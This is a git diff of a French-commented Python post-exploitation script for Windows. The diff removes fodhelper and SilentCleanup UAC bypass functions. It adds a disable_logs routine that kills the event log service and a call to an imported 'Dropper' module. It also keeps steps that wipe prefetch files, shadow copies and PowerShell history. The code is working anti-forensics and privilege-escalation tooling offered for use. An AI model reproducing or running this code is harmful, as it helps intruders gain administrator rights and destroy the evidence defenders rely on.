@@ -4,6 +4,8 @@ import sys
 import re
 import pyfiglet
 import subprocess
+import psutil
+import Dropper
 """
 A faire : 
 Delete le prefetch
@@ -20,80 +22,7 @@ except:
 	pass
 
 
-file = sys.argv[0].upper()
-#print(f"This is the name of the script: {file}")
-#Ici on récupère le nom de l'exe, meme si le nom a été changé on pourra quand meme retrouver le prefetch
-len_path = len(os.getcwd())
-#print(len_path)
-len_file = len(file)
-#print(len_file)
-len_path_file = len_file - len_path -1
-#Permet d'enlever le /
-#print(len_path_file)
-print(file[-len_path_file:])
-#print(file[:len_file])
-#print(file[-len_file:])
 
-
-
-def bypass_uac_1():
-	cmd = f"C:\Windows\System32\cmd.exe /k powershell.exe Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -value '0'"
-	try:
-		os.system(f'reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d "{cmd}" /f')
-		os.system('reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f')
-		os.popen('fodhelper.exe')
-		time.sleep(10)
-		os.popen("powershell \"Start-Process powershell -Verb runas 'taskkill /F /IM cmd.exe'\"")
-		os.system('reg delete "HKCU\Software\Classes\.thm\" /f')
-		os.system('reg delete "HKCU\Software\Classes\ms-settings\" /f')
-	except:
-		pass
-
-
-def bypass_uac_2():
-	#Necessite AV désactivé
-	cmd = "C:\Windows\System32\cmd.exe &REM"
-	os.system(f'reg add "HKCU\Environment" /v "windir" /d "{cmd}" /f') #On réécrit la variable d'env windir
-	os.system('schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I')
-	#Voir DLL hijack pour une meilleure réussite car flag par windows defender
-
-def detect_uac():
-	global bypass_uac
-	try:
-		username = os.environ['username']
-		stream = os.popen(f'net user {username} | findstr Admin')
-		output = stream.read()
-		if len(output) != 0: #Si réponse alors il fait parti du grp admin
-			print("Yeah Admin")
-			get_uac = os.popen('powershell.exe (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA') 
-			output_uac = get_uac.read()
-			output_uac = int(output_uac)
-			if output_uac == 1: #Regarde si UAC est activé
-				print("UAC is enabled")
-				#On veut connaitre le niveau de l'UAC
-				uac_value = os.popen('powershell.exe (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin')
-				output_uac_value = uac_value.read()
-				output_uac_value = int(output_uac_value)
-				print(output_uac_value)
-				if output_uac_value == 2:
-					return False
-				elif output_uac_value == 0: 
-					return True
-				else:
-					bypass_uac_1()
-					return True
-
-			else:
-				print("UAC not enabled\n no need to bypass")
-				return True
-			
-		else:
-			return False
-			print("Not admin :/")
-			
-	except:
-		quit()
-	
 
 def delete_prefetch():
 	windows = os.environ['WINDIR'] + "\Prefetch"
@@ -154,19 +83,50 @@ def powershell_history():
 	except:
 		print("Le fichier n'existe pas")
 
+
+def try_kill(pid):
+    try:
+        os.popen(f"powershell \"Start-Process powershell -Verb runas 'taskkill /PID {pid} /F '\"")
+        return True
+    except:
+        return False
+
+def disable_logs():
+	#commande = 'auditpol /clear /y'
+    #commande_disable_logs = "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId"
+	disable_log = os.popen(""" powershell "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId" """)
+	output = disable_log.read()
+	output = int(output)
+	print(output)
+	if output == 0:
+		pass
+		return True
+	else:
+		if try_kill(output):
+			time.sleep(5)
+			get_id_log = os.popen(""" powershell "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId" """)
+			output_id = get_id_log.read()
+			print(output_id)
+			output_id = int(output_id)
+			if output_id == 0:
+				print("C'est tout bon")
+				return True
+			else:
+				print(u"Output ID != 0")
+				return False
+		else:
+			print(u"Try Kill pas marché ")
+			return False
+"""
 def clear_logs():
-	commande = f'sc config eventlog start= disabled'
-	os.popen("powershell \"Start-Process powershell -Verb runas '{commande}'")
-	#sc config eventlog start= disabled
-	#wevtutil cl system ; wevtutil cl application ; wevtutil cl security
-
-
+	commande = "wevtutil cl system && wevtutil cl application && wevtutil cl security"
+"""
 def main():
-	if detect_uac():
-		#clear_log()
-		vss()
-		delete_prefetch()
-	powershell_history()
+	if Dropper.main():
+		if disable_logs():
+			vss()
+			delete_prefetch()
+		powershell_history()
 	test = input("Tapes sur  Enter ...")
 
 main()
